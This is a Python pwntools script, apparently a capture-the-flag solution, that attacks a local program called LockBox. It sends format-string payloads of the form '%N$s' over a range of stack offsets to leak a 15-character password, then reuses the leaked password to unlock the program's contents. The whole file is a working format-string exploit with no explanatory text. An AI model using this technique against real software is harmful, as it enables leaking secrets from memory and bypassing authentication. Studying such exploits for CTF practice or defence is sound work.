from pwn import *

binary = ELF('./LockBox')

found = False
index = 0
while not found and index < 50:
    print(f"Trying index: {index}")
    payload = f"%{index}$s"

    p = process("./LockBox")
    # p = remote('localhost', 1448)
    p.sendline(payload)
    p.recvline()

    try:
        res = p.recvline()

        try: 
            code = res.decode(errors='ignore').split(" is not correct")[0].strip()

            if len(code) == 15:
                print(f"[+] Candidate password: {code}")

                p.close()
                p = process("./LockBox")
                # p = remote('localhost', 1448)
                p.sendline(code)
                p.recvline()
                p.sendline(code)

                output = p.recvline(timeout=1)

                if b"CONTENTS:" in output:
                    found = True
                    print(output)

        except UnicodeDecodeError:
            print("UnicodeDecodeError during decode.")

    except EOFError:
        print("Process crashed, likely due to bad format string.")
    
    finally:
        p.close()

    index += 1
